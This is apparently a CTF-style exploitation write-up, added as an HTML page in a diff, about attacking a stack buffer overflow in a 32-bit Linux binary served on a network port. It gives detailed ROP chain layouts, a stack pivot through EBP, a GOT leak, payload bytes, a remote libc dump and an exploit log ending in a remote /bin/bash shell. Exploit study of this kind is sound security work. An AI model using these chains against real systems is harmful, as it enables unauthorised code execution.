@@ -1,0 +1,641 @@
+<html>
+<head>
+<title>Dumping libc memory space to bypass ASLR</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                                           ┌───────────────────────┐
+                                                                           ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                                           │ █   █ █ █ █   █       │
+                                                                           │ █   █ █ █ █▀▀▀▀       │
+                                                                           │ █   █   █ █     ▄     │
+                                                                           │                 ▄▄▄▄▄ │
+                                                                           │                 █   █ │
+                                                                           │                 █   █ │
+                                                                           │                 █▄▄▄█ │
+                                                                           │                 ▄   ▄ │
+                                                                           │                 █   █ │
+                                                                           │                 █   █ │
+                                                                           │                 █▄▄▄█ │
+                                                                           │                 ▄▄▄▄▄ │
+                                                                           │                   █   │
+Dumping libc memory space to bypass ASLR                                   │                   █   │
+~ jonaslyk                                                                 └───────────────────█ ──┘
+ 
+I executed the ELF file in an Ubuntu virtual machine, and was greeted by:
+
+    Shall we play a game?
+    0. Hello world
+    1. All your base
+    2. Months that start with Feb
+
+But all inputs returned the message: "Invalid selection puny human!"
+
+I opened the executable in IDA, and saw that if I entered 42, a different code path would be 
+followed.
+
+With 42 as input, I got a new message:
+
+    "Well met young skywalker... Your move."
+
+All answers to that would output: "On second thoughts, let's not go there. It is a silly place." 
+then the executable exited.
+
+I discovered a stack-based buffer overflow, when scanf read the second input as a string.
+
+Initially I wanted to successfully exploit it locally where I could attach a debugger.
+Targeting the remote server would be the next step.
+
+I added the executable to xinetd, connected a debugger to the executable and input a cyclic pattern 
+long enough to crash the executable.
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41396941 in ?? ()
+
+    (gdb) i r
+    eax 0x0
+    ecx 0xb779f000   
+    edx 0xb777f898   
+    ebx 0xb777e000   
+    esp 0xbfd9fb50   
+    ebp 0x38694137      - Offset 263 in the cyclic pattern 
+    esi 0x0 0
+    edi 0x0 0
+    eip 0x41396941      - Offset 267 in the cyclic pattern
+
+    (gdb) x/8xw $esp - 16
+    0xbf8264f0: 0x41356941  0x69413669  0x38694137  0x41396941
+    0xbf826500: 0x00000000  0xbf82652c  0x080486be  0x080486ad
+
+The executable crashed because the overflow caused EIP to become character 267-271 in the input.
+What protections did the executable use?
+
+    jonas@jonas-VirtualBox:~/crash$ ./checksec.sh --file vuln0 
+    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+    Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   vuln0
+
+NX is enabled, so it is not possible to just input and execute arbitrary code.
+PIE is not enabled, making the executables sections static and known.
+RELRO is only partial, so it is possible to modify GOT entries if needed.
+Stack canaries are not used.
+
+Let us see which libc functions are available:
+
+    jonas@jonas-VirtualBox:~/crash$ objdump -T vuln0 
+    
+    vuln0:     file format elf32-i386
+    
+    DYNAMIC SYMBOL TABLE:
+    00000000  w   D  *UND*   00000000              __gmon_start__
+    00000000      DF *UND*   00000000  GLIBC_2.0   __libc_start_main
+    00000000      DF *UND*   00000000  GLIBC_2.0   fflush
+    00000000      DF *UND*   00000000  GLIBC_2.0   printf
+    00000000      DF *UND*   00000000  GLIBC_2.7   __isoc99_scanf
+    00000000      DF *UND*   00000000  GLIBC_2.0   puts
+    0804a020 g    DO .bss    00000004  GLIBC_2.0   stdout
+    0804864c g    DO .rodata 00000004  Base        _IO_stdin_used
+
+fflush, printf, scanf and puts- nothing that makes it possible to bypass NX and execute arbitrary 
+code.
+
+Is there some gadgets with instructions that are particularly useful for exploitation such 
+as REP: MOVS, PUSHAD or POPAD?
+
+    root@jonas-VirtualBox:/home# objdump -d exploit|grep -P "f3 a4"\|"60 "\|"61 "
+    8048476:    72 e8                   jb     8048460 <__do_global_dtors_aux+0x30>
+
+No, the only result was a false positive because the jb address contains 60 followed by a space.
+
+The executable communicates using stdin and stdout, so I assume the executable gets spawned by a 
+daemon when a connection is made on port 1984. The daemon then redirects the executables standard 
+streams to the new connections tcp streams.
+
+If I could make the executable launch a shell, the daemon would still redirect the streams, giving 
+me the ability to send the shell commands and read the resulting output. It could be done with just
+one call to a libc library function, no shellcode required.
+ 
+To launch a shell, I needed the address of a function that replaces the current process image with 
+another executable, such as the exec family of functions(execl,execlp etc.).
+
+I had four ideas that might be able to circumvent the problem:
+
+1. Call execve directly using a system call.
+   - Instead of using libc, I could setup the registers with the system call number for execve, and 
+     the filename of a shell as argument.
+   - Then make EIP point to an executable address containing an "INT 0x80" or SYSENTER instruction.
+    
+2. Leak an address in libc, use that as a relative offset.
+   - First, make the executable output a pointer to something in the libc memory space.
+   - Then locally calculate the distance between the leaked address and the address of the libc 
+     function I want to call.
+   - It will not work on the remote server if the remote libc is not identical to my local libc 
+     though.
+    
+3. Traverse the link_map
+   - The link_map structure is pointed to, from a static known location.
+   - Using a leak, I could follow the l_prev/l_next pointers until l_name points to the libc 
+     filename.
+   - Then follow the link_map.l_ld pointer to the dynamic section of the library.
+   - Iterate the Elf32_Dyn structures, and save the locations of the DT_GNU_HASH, DT_SYMTAB and 
+     DT_STRTAB.
+   - Iterate the Elf32_Sym structures in DT_GNU_HASH and lookup the st_name index in the DT_STRTAB.
+   - If that contains the name of the function I want to call, use the st_value as an index into 
+     DT_SYMTAB.
+   - The offset to the function can be read from there.
+
+4. Return to _dl_runtime_resolve
+    Libc functions are resolved at runtime by the  _dl_runtime_resolve libc function, pointed to by 
+    an entry in the GOT table.
+    The _dl_runtime_resolve function takes a pointer to the link_map and an index into the 
+     relocation table as arguments.
+    Then, by parsing the link_map structure _dl_runtime_resolve will resolve the function and save 
+     the resolved address in the GOT table.
+    The identifier of the target function is an index into the relocation table.
+    The relocation table have an offset to the function in the symtab. 
+    Therefore it can only be used to resolve functions already present in the symtab.
+    However, the address of the symtab is cached at a static location in the writeable .bss section.
+    If that gets overwritten with a pointer to a fake symtab, it becomes possible to make 
+     _dl_runtime_resolve resolve any function I want.
+    
+The executable did not contain the needed assembly instructions to do a system call, so the idea of 
+using system calls proved to be impossible. I knew the two solutions involving the link_map 
+structure would work remotely if locally, unless the server was using some additional security 
+features.
+
+The solution depending on a libc function having identical offsets on the server and locally was not
+guaranteed to work remotely, though. The amount of work required to implement one was many factors 
+less than the others. If it did not work remotely, perhaps I could identify the libc version or the 
+Linux distribution and version, and use that to get a copy of the specific libc.
+If that also failed, I could always switch that part of the exploit, so I decided to start by making
+the exploit work locally, using that approach.
+
+All three approaches requires the ability to leak data at a specific address, so that was the first 
+thing that I did. Calling puts or printf with a pointer to what I want to leak, then flushing stdout
+will send me the data that it points to. Flushing is necessary because when stdout is redirected to 
+a socket stream the data will be cached until stdout is flushed.
+
+The buffer used by scanf(0x08048583) will overflow into the saved return pointer on the stack after 
+267 characters. When the RET(0x080485A1) instruction in the play function is executed EIP will 
+become character 267-271 in the scanf buffer.
+  
+    .text:08048564                 mov     eax, ds:stdout@@GLIBC_2_0
+    .text:08048569                 mov     [esp], eax      ; stream
+    .text:0804856C                 call    _fflush
+    .text:08048571                 mov     eax, offset formatAsString ; "%s"
+    .text:08048576                 lea     edx, [ebp+0x118]
+    .text:0804857C                 mov     [esp+4], edx
+    .text:08048580                 mov     [esp], eax      ; format
+    .text:08048583                 call    _scanf
+    .text:08048588                 mov     dword ptr [esp], offset s ; "On second thoughts, let's not go there."...
+    .text:0804858F                 call    _puts
+    .text:08048594                 mov     eax, 0
+    .text:08048599                 jmp     short skipSetEax1
+    .text:0804859B not42:                                  ; CODE XREF: play+D
+    .text:0804859B                 mov     eax, 1
+    .text:080485A0
+    .text:080485A0 skipSetEax1:                            ; CODE XREF: play+59
+    .text:080485A0                 leave
+    .text:080485A1                 retn
+
+If the following data is input to the scanf buffer, the data at `LeakAddress` will be sent over the
+socket stream:
+
+    'A' * 267
+    .RetPointer     [ puts        ] - A pointer to the puts plt entry.
+    .RetPointer+4   [ PopRet      ] - A gadget that will remove the argument for the just called function, then continue the ROP chain.
+    .RetPointer+8   [ LeakAddress ] - The address to leak
+    .RetPointer+12  [ fflush      ] - A pointer to the fflush plt entry.
+    .RetPointer+16  [ PopRet      ] - A gadget that will remove the argument for the just called function, then continue the ROP chain.
+    .RetPointer+20  [ stdout      ] - A pointer to stdout
+
+There are several problems with this approach though:
+
+1. fflush requires a pointer to stdout, a pointer to stdout is stored at a static known location, 
+   but to call fflush that pointer needs to be dereferenced.
+2. It is not possible to control how much to leak, it will leak to the next 0x00 byte after the 
+   `LeakAddress`.
+3. Addresses containing 0x20,0x09,0x0a,0x0b,0x0c,0x00 or 0x0d cannot be leaked because the ROP chain
+   is created using scanf with %s as the format string.
+
+To bypass the problem of getting stdout on the stack the code that calls fflush at 0x08048564 can be
+reused. That will increase the complexity though, many instructions will be executed before control
+of EIP can be regained.
+
+When the LEAVE instruction is executed EBP will be copied to ESP, EBP will be popped, then RET will 
+make EIP = [ESP]. Hence, if the data at EBP + 4 is controlled when RET is executed EIP can be 
+controlled. Currently the only controlled data is the scanf buffer but its address is unknown, 
+because the stack is randomized. EBP is also used at 0x08048576 - here it is used as the base 
+address for the offset for where scanf will store the input. 
+
+That means RET will make EIP = what is stored at: 
+  
+  scanf buffer + 0x118(263) + 4 (Because LEAVE also pops EBP).
+
+Since EBP is the base address of the offset for the scanf buffer it is possible to control where the
+scanf buffer will be stored by controlling EBP. The debugger showed EBP had the value of the input 
+cyclic pattern at offset 263-267, so changing that will change the location of the scanf buffer. By
+making the input to scanf large enough, control of ESP and EIP is gained, this bypasses the 
+randomization of the stack without requiring a leak.
+
+To launch a shell the filename of the shell executable needs to be provided, that is done with a 
+pointer to a string with the filename. Therefore the ability to choose what address the input will 
+be stored at will be helpful.
+
+The approach makes it possible to:
+    Leak an address
+    Input a filename and know where it will be stored
+    Create a new stack containing the leaked address and the address of the filename in the stack.
+    Make ESP point to the new stack, then execute a RET instruction 
+
+The address to leak, is a pointer to a libc function. The .plt entry for puts is already used, so 
+why not reuse that? First the distance between puts and the function to call needs to be calculated.
+I have chosen execve:
+
+    (gdb) p execve - puts
+    $1 = 329104
+
+The signature of execve is:
+    int execve(const char *filename, char *const argv[], char *const envp[]);
+
+The filename will be "/bin/bash", argv[] and envp[] pointers to 0x00000000.
+The last thing to do, is deciding where to put the new stack. I chose 0x0804A174 because it was 
+writeable, appeared to be unused and was filled with 0x00.
+ 
+So the attack, starting with the first input to scanf, was executed like this:
+
+'A' * 263                          
+.RetPointer-4 [ newStack    ] - This value will end up in EBP, and be used as the base address for the scanf buffer offset.
+.RetPointer   [ puts        ] - A pointer to the puts plt entry 
+.RetPointer+4 [ 0x08048564  ] - After puts has printed the address, jump to where stdout gets dereferenced and fflush is called  ---------+
+.RetPointer+8 [ LeakAddress ] - The address to leak, identical to plt.puts                                                                |
+                                                                                                                                          |
+   +--------------------------------------------------------------------------------------------------------------------------------------+
+   |
+   V
+08048564   mov     eax, ds:stdout@@GLIBC_2_0
+08048569   mov     [esp], eax
+0804856C   call    _fflush                              The leaked address in the buffer will be flushed ---------------------------------------+
+08048571   mov     eax, offset formatAsString ; "%s"                                                                                            |
+08048576   lea     edx, [ebp-263]                       This will be used to decide where scanf saves the input, EBP is = newStack              |
+0804857C   mov     [esp+4], edx                                                                                                                 |
+08048580   mov     [esp], eax      ; format                                                                                                     |
+08048583   call    _scanf                               Here I input the new stack.---------------------------------------------------------+   |
+.....                                                                                                                                       |   |
+080485A0   leave                                        ESP = newStack + 267 + 4                                                            |   |
+080485A1   retn                                         EIP = [ESP]                                                                         |   |
+   +----------------------------------------------------------------------------------------------------------------------------------------+   |
+   |                                                                                                                                            |
+   |                 +--------------------------------------------------------------------------------------------------------------------------+
+   V                 |
+'A' * 267            V
+.newStack+267 [ leakedAddress + 329104 ] - LeakedAddress + the distance to execve from the leaked plt.puts entry.
+.newStack+271 [ retAddr                ] - Return address after execve, it will not be called because execve never returns.
+.newStack+275 [ newStack + 287         ] - Pointer to the "/bin/bash" string at newStack + 287 ----+
+.newStack+279 [ newStack + 298         ] - A pointer to 0x00000000                                 |
+.newStack+283 [ newStack + 298         ] - A pointer to 0x00000000                                 |
+.newStack+287 [ /bin                   ] - Shell filename <----------------------------------------+
+.newStack+291 [ /bas                   ]   
+.newStack+294 [ h                      ]   
+
+After sending the ROP chains, I sent a pwd command and read the returned data to verify that the 
+answer was coming from a shell. If the pwd command was successful, I entered a loop, forwarding 
+stdin input to the socket stream, then reading from the socket until the read timed out. Thus 
+allowing me to control the shell.
+ 
+    jonas@jonas-VirtualBox:~/crash$ ./netExploit localhost
+    [*] Connected to host !
+    
+    Shall we play a game?
+    0. Hello world
+    1. All your base
+    2. Months that start with Feb
+    
+    >42
+    
+    Well met young skywalker... Your move.
+    
+    Sending payload stage 1:
+    \x87\xa2\x4\x8\xcc\x83\x4\x8\x44\x85\x4\x8\x8\xa0\x4\x8\xa
+    
+    > On second thoughts, let's not go there. It is a silly place.
+    
+    Payload stage1 successful, retreived leaked got.plt entrys:
+    \xa0\x17\xe9\xb7\xd0\x8e\xe7\xb7\x30\x26\xe8\xb7\x40\x37\xe9\xb7\xa
+    
+    Successfully extracted current address of puts in libc from leaked got.plt data:
+    0xb7e917a0
+    
+    Distance from libc.puts to libc.execve is 329104 (0x50590)
+    0xb7e917a0 + 0x50590 = 0xb7ee1d30
+    
+    Successfully constructed relative ROP chain, and delivered stage2 payload: 
+    \x70\x3b\xee\xb7\xff\xa2\x4\x8\x9f\xa2\x4\x8\xff\xa2\x4\x8\xff\xa2\x4\x8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\xa
+     
+    Remote shell should be spawned, testing by sending pwd command.
+    
+    pwd returned:/
+    
+    Remote shell successfully spawned
+    
+    ls
+
+    bin
+    boot
+    dev
+    etc
+    home
+    lib
+    lib32
+    lib64
+    lost+found
+    media
+    mnt
+    opt
+    proc
+    root
+    run
+
+
+Now the exploit was working locally, the next step was the remote server. The initial plt entry leak
+was successful, but after sending the second ROP chain the connection terminated.
+
+The first byte of the leaked address was identical to my local system, so I had no reason to suspect
+the leaked address was wrong. I assumed that the reason the connection terminated, was because the 
+executable crashed- but why?
+
+I had 3 suspects that could be the cause of the crash. 
+Could some of them be eliminated?
+
+1.  The address I created the fake stack at could not be written to or is not filled with 0x00 bytes.
+    - I used the leaked at the address and the adjacent addresses. Every time I got an empty string 
+      back, indicating reading is allowed and it contains 0x00 bytes.
+    - That does not exclude that the address is not writeable or too small for the input though.
+    - Then I made scanf write a value with identical size and afterwards called puts on it- it 
+      appeared the data was saved correctly.
+
+2. "/bin/bash" does not exist.
+    - I tried different standard linux paths and filenames, but all gave the same result.
+
+3. The distance between the leaked function and execve could be wrong.
+   - Instead of calling execve I tried calling the libc function pause. 
+   - If the connection did not terminate, I could conclude that the distance between puts and pause 
+     was identical to my local libc. 
+   - But the connection terminated exactly as before.
+   - Then I used the leak, to show me the data where the puts plt entry pointed to.
+   - I disassembled the leaked data and found padding and a typical function prologue, but it was 
+     not identical to my local libc.
+
+I concluded the reason of the crash was the difference in the libc libraries. I considered 
+bruteforcing the execve address- it would be possible, but not very elegant. The remote server's 
+puts address did not change when the executable crashed- so I could just keep trying until I got 
+the right execve address. I prefer making an exploit that works every time on all systems though, 
+or at least would not cause a crash on every failed try.
+
+I could try resolving execve by using _dl_runtime_resolve, or traversing the link_map structure. 
+I estimated the traversing method would be the easiest. To do that, I had to solve another problem 
+first. I needed a way to input all characters as I was limited by scanf discarding white space 
+characters.
+
+The chance of link_map containing a pointer, or the _dl_runtime_resolve requiring a fake symtab 
+with a white space character is very high. Solving that would also make leaking much less complex
+as I would be able to put 0x00000000 on the stack as an argument to fflush, causing all streams to
+be flushed, instead of having to deal with dereferencing stdout.
+
+If I made scanf use a format string with %x instead of %s, I could input the hex value for the data
+I wanted, thus bypassing that problem. The value has to fit in an integer though, limiting the 
+length of the input. To input longer data I decided to make scanf parse the input as multiple hex 
+values by using a format string like: "%x%x%x", and store the first value at X, the next at X+4 etc.
+Then data can then be input as "01020304 05060708 090A0B0C" and every byte will be stored correctly.
+
+Using that approach I could create a "perfect leak" ROP chain- just calling puts on the address to 
+leak does not work well on binary data. I wanted to be able to leak a word being 100% sure of the 
+data, but puts will copy from the address provided to stdout, until it reaches an 0x00, then it 
+will copy an 0x0A to stdout.
+
+Calling puts on the word 0x0A00000A outputs 0x0A0A and because stdout is line buffered two lines 
+would have to be read to empty the buffer. Then it is not possible to know if the first two bytes 
+of the leaked data was 0x0A00 or the first three bytes where 0x0A0A00.
+
+Instead, if printf is used with a format string containing a magic stop character like "%s-\n", 
+then 0x0A00000A will output "\n-" and 0x0A0A0000 will output "\n\n-" . But that will not work if 
+the data contains the magic stop character. Instead I made printf always only return one character, 
+followed by a magic stop character.
+
+Then, if I read a line that did not contain the stop character I knew the byte was 0x0A, and I had 
+to read one more line to empty the buffer. If I read a line with only the stop character the byte 
+was 0x00. This requires four calls to printf to leak one word, but making it happen four times is 
+not much harder than one time.
+
+To implement those ideas, I had to store two format strings at known addresses to reference later.
+    1. A format string to parse the "perfect leak" ROP chain in hex was needed, it should contain 
+       one %x for each word in the ROP chain.
+    2. A format string to output one byte, a magic stop character, and a 0x0A. 
+
+I could not input the 0x0A byte if scanf parsed the input as a strings, and there were no format 
+string to parse it as a hex value yet. Instead of creating a format string to input the next format
+string I decided to parse it as two decimals, I had a "%d" format string.
+
+The attack was executed like this:
+
+'A' * 267                          
+.RetPointer     [ scanf          ] - A pointer to the scanf plt entry 
+.RetPointer+4   [ popPopRet      ] - A gadget that will move ESP to the next scanf frame and return into the first entry 
+.RetPointer+8   [ "%s"           ] - A pointer to "%s" 
+.RetPointer+12  [ newLocation    ] - The new stack at a chosen blank writeable address ------------------------------------+
+                                                                                                                           |
+scanf input will be one "%x" for each word in the "perfect leak" ROP chain                                                 | 
+                                                                                                                           |
+.RetPointer+16  [ scanf          ] - A pointer to the scanf plt entry                                                      |
+.RetPointer+20  [ popPopRet      ] - A gadget that will move ESP to the next scanf frame and return into the first entry   |
+.RetPointer+24  [ "%d"           ] - A pointer to "%d"                                                                     |
+.RetPointer+28  [ newLocation+50 ] - The new stack + 50 characters- past the first format string -----------------------+  |
+                                                                                                                        |  |
+scanf input will be "1932602917"  - "%1.s" in ascii.                                                                    |  |
+                                                                                                                        |  |
+.RetPointer+32  [ scanf          ] - A pointer to the scanf plt entry                                                   |  |
+.RetPointer+36  [ popPopRet      ] - A gadget that will move ESP to the next frame and return into the first entry      |  |
+.RetPointer+40  [ "%d"           ] - A pointer to "%d"                                                                  |  |
+.RetPointer+44  [ newLocation+54 ] - Right past the previous entry, so the two entries will be adjacent   -----------+  |  |      
+                                                                                                                     |  |  |
+scanf input will be "666925"  - "--\n" in ascii.                                                                     |  |  |  
+                                                                                                                     |  |  |
+Now the needed format strings have created the "perfect leak" ROP chain can be input.                                |  |  |
+The scanf frame requires many arguments, making it not possible to use a pop gadget to adjust ESP afterwards.        |  |  |
+Instead the address I want ESP to become is stored in EBP first, then the return address can be a LEAVE gadget.      |  |  |
+By making EBP identical to where the ROP chain will be stored, execution flow will go to the chain, after creation.  |  |  |
+                                                                                                                     |  |  |
+.RetPointer+48  [ PopEBP         ] - A gadget that wil pop the next entry into EBP                                   |  |  |
+.RetPointer+52  [ LeakChain      ] - The address where the leak ROP chain will be stored at -------------------+     |  |  |
+                                                                                                               |     |  |  |
+.RetPointer+56  [ scanf          ] - A pointer to the scanf plt entry.                                         |     |  |  |
+.RetPointer+60  [ Leave          ] - A leave gadget                                                            |     |  |  |
+.RetPointer+64  [ newLocation    ] - Where the string of %x is stored, used to parse the ROP chain in hex -+   |     |  |  |
+.RetPointer+68  [ LeakChain      ] - The address where the leak ROP chain will be stored at ------+        |   |     |  |  |
+.RetPointer+72  [ LeakChain + 4  ]                                                                |        |   |     |  |  |
+.RetPointer+76  [ LeakChain + 8  ]                                                                |        |   |     |  |  |
+.RetPointer+80  [ LeakChain + 12 ]                                                                |        |   |     |  |  |
+.........                                                                                         |        |   |     |  |  |
+                                                                                                  |        |   |     |  |  |
+scanf input will be the "perfect leak" ROP chain in hex.                                          |        |   |     |  |  |
+                                                                                                  |        |   |     |  |  |
+                                  +---------------------------------------------------------------|--------+   |     |  |  |
+                                  |                                                               |            |     |  |  |
+                                  V                                                               |            |     |  |  |
+.newLocation     [ "%x%x"        ] <--------------------------------------------------------------|------------|-----|--|--+
+.newLocation+4   [ "%x%x"        ]                                                                |            |     |  | 
+.newLocation+8   [ "%x%x"        ]                                                                |            |     |  | 
+.newLocation+12  [ "%x%x"        ]                                                                |            |     |  |
+.......                                                                                           |            |     |  |
+.newLocation+46  [0x00000000     ]                                                                |            |     |  |
+                                  +---------------------------------------------------------------|------------|--+  |  |     
+                                  |                                                               |            |  |  |  |     
+                                  V                                                               |            |  |  |  |     
+.newLocation+50  ["%1.s"         ] <--------------------------------------------------------------|------------|--|--|--+     
+.newLocation+54  ["--\n"         ] <--------------------------------------------------------------|------------|--|--+                
+                                                                                                  |            |  |                
+ Notice, I decided to use two "-" as magic stop characters.                                       |            |  |                
+                                                                                                  |            |  |  
+                                  +---------------------------------------------------------------|------------+  |                
+                                  |---------------------------------------------------------------+               |                
+                                  |                                                                               |                
+                                  V                                                                               |                
+.LeakChain     [ printf          ] A pointer to the scanf plt entry                                               |                
+.LeakChain+4   [ popPopRet       ] A gadget that will move ESP to the next frame and return into the first entry  |                
+.LeakChain+8   [ "%1.s--\n"      ] The format string for leaking one byte, previously created --+-----------------+                
+.LeakChain+12  [ leakAddress     ] The address to leak                                          |                
+                                                                                                |                
+.LeakChain+16  [ printf          ]                                                              |                
+.LeakChain+20  [ popPopRet       ]                                                              |                
+.LeakChain+24  [ "%1.s--\n"      ] -------------------------------------------------------------+                
+.LeakChain+28  [ leakAddress + 1 ] The address to leak + 1
+........ 
+And two more identical frames for printing the leakAddress +2 and +3
+
+Now the content at the address to leak is printed, stdout needs to be flushed.
+
+.LeakChain+64  [ fflush          ] A pointer to the fflush plt entry.
+.LeakChain+68  [ popRet          ] A gadget that will move ESP to the next frame and return into the first entry. 
+.LeakChain+72  [ 0x00000000      ] When fflush gets NULL as an argument all streams are flushed.
+
+Now the leak is complete, but the ROP chain has been destroyed during execution.
+A new scanf frame is created and execution flow is transferred to the input- making it possible to 
+recreate and execute the leak chain again.
+
+.LeakChain+76  [ scanf           ] A pointer to the scanf plt entry.
+.LeakChain+80  [ popPopRet       ] A gadget that will move ESP to the next frame and return into the first entry. 
+.LeakChain+84  [ "%s"            ]
+.LeakChain+88  [ LeakChain+104   ] Scanf stores the new input after this ROP chain.
+
+.LeakChain+92  [ popEBP          ] Pop where the previous scanf input is -4(Leave also do a pop)
+.LeakChain+96  [ LeakChain+100   ]
+
+.LeakChain+100 [ Leave           ] Transfer execution to the new input.
+
+Now the basic building blocks for getting the execve address are in place. Any address can be 
+leaked, as many times as needed, making it possible to parse and follow addresses in the link_map 
+structure.
+
+But I had an alternative idea- instead I could simply dump the entire libc memory segment. Then I 
+could identify the execve address, and calculate the distance between that and puts. It is not quite
+as "elegant" as parsing the structures, and a lot slower, but it would work and required a lot less 
+coding. 
+
+First, I needed the base address of libc. I knew it would be a multiple of the page size, and it 
+would start with \x7fELF.
+
+I took the leaked address of puts, rounded it to a multiply of the page size, leaked the word at the
+address and subtracted one page size until I read \x7fELF. Then I started a loop reading one word at
+a time, saving it to a local file. It took around 2 days, then the connection terminated. The file 
+and its size looked correct, so the connection probably terminated because the executable crashed, 
+trying to read beyond libcs boundary.
+
+Now I had to identify execve. I looked at my local execve and saw the instruction "Mov eax, 0b"- 
+that was perhaps unique enough to identify the function. I searched the downloaded libc for that 
+instruction and got around 10 results and iterated over them. There was one that was very similar 
+to my local function:
+
+    LOAD:000B8FA0 sub_B8FA0       proc near               ; CODE XREF: LOAD:0003ED5B
+    LOAD:000B8FA0                                         ; sub_B9000+84 ...
+    LOAD:000B8FA0
+    LOAD:000B8FA0 var_8           = dword ptr -8
+    LOAD:000B8FA0 var_4           = dword ptr -4
+    LOAD:000B8FA0 arg_0           = dword ptr  4
+    LOAD:000B8FA0 arg_4           = dword ptr  8
+    LOAD:000B8FA0 arg_8           = dword ptr  0Ch
+    LOAD:000B8FA0
+    LOAD:000B8FA0                 sub     esp, 8
+    LOAD:000B8FA3                 mov     [esp+8+var_8], ebx
+    LOAD:000B8FA6                 mov     edx, [esp+8+arg_8]
+    LOAD:000B8FAA                 mov     [esp+8+var_4], edi
+    LOAD:000B8FAE                 mov     ecx, [esp+8+arg_4]
+    LOAD:000B8FB2                 call    sub_12AC63
+    LOAD:000B8FB7                 add     ebx, 0EB03Dh
+    LOAD:000B8FBD                 mov     edi, [esp+8+arg_0]
+    LOAD:000B8FC1                 xchg    ebx, edi
+    LOAD:000B8FC3                 mov     eax, 0Bh
+    LOAD:000B8FC8                 call    dword ptr gs:loc_F+1
+    LOAD:000B8FCF                 xchg    edi, ebx
+    LOAD:000B8FD1                 cmp     eax, 0FFFFF000h
+    LOAD:000B8FD6                 ja      short loc_B8FE3
+    LOAD:000B8FD8
+    LOAD:000B8FD8 loc_B8FD8:                              ; CODE XREF: sub_B8FA0+51
+    LOAD:000B8FD8                 mov     ebx, [esp+8+var_8]
+    LOAD:000B8FDB                 mov     edi, [esp+8+var_4]
+    LOAD:000B8FDF                 add     esp, 8
+    LOAD:000B8FE2                 retn
+    LOAD:000B8FE3 ; ---------------------------------------------------------------------------
+    LOAD:000B8FE3
+    LOAD:000B8FE3 loc_B8FE3:                              ; CODE XREF: sub_B8FA0+36
+    LOAD:000B8FE3                 mov     edx, ds:(dword_1A3EFC - 1A3FF4h)[ebx]
+    LOAD:000B8FE9                 neg     eax
+    LOAD:000B8FEB                 mov     gs:[edx], eax
+    LOAD:000B8FEE                 or      eax, 0FFFFFFFFh
+    LOAD:000B8FF1                 jmp     short loc_B8FD8
+    LOAD:000B8FF1 sub_B8FA0       endp
+    
+compared to my local function:
+    
+    .text:000B6470                 public execve ; weak
+    .text:000B6470 execve          proc near               ; CODE XREF: sub_3FB90+44C
+    .text:000B6470                                         ; fexecve+76 ...
+    .text:000B6470
+    .text:000B6470 arg_0           = dword ptr  4
+    .text:000B6470 arg_4           = dword ptr  8
+    .text:000B6470 arg_8           = dword ptr  0Ch
+    .text:000B6470
+    .text:000B6470                 push    edi
+    .text:000B6471                 push    ebx
+    .text:000B6472                 mov     edx, [esp+8+arg_8]
+    .text:000B6476                 call    sub_12722B
+    .text:000B647B                 add     ebx, 0F5B85h
+    .text:000B6481                 mov     ecx, [esp+8+arg_4]
+    .text:000B6485                 mov     edi, [esp+8+arg_0]
+    .text:000B6489                 xchg    ebx, edi
+    .text:000B648B                 mov     eax, 0Bh
+    .text:000B6490                 call    large dword ptr gs:10h
+    .text:000B6497                 xchg    edi, ebx
+    .text:000B6499                 cmp     eax, 0FFFFF000h
+    .text:000B649E                 ja      short loc_B64A3
+    .text:000B64A0
+    .text:000B64A0 loc_B64A0:                              ; CODE XREF: execve+48
+    .text:000B64A0                 pop     ebx
+    .text:000B64A1                 pop     edi
+    .text:000B64A2                 retn
+    .text:000B64A3 ; ---------------------------------------------------------------------------
+    .text:000B64A3
+    .text:000B64A3 loc_B64A3:                              ; CODE XREF: execve+2E
+    .text:000B64A3                 mov     edx, ds:(errno_ptr - 1AC000h)[ebx]
+    .text:000B64A9                 neg     eax
+    .text:000B64AB                 mov     ecx, large gs:0
+    .text:000B64B2                 mov     [ecx+edx], eax
+    .text:000B64B5                 or      eax, 0FFFFFFFFh
+    .text:000B64B8                 jmp     short loc_B64A0
+    .text:000B64B8 execve          endp
+
+I was pretty sure this was the execve function, so I subtracted the offset of the leaked puts with 
+the address of the function. I updated my previous exploit with the the new distance, executed it, 
+and got a shell :)
+
+</pre></div></body>
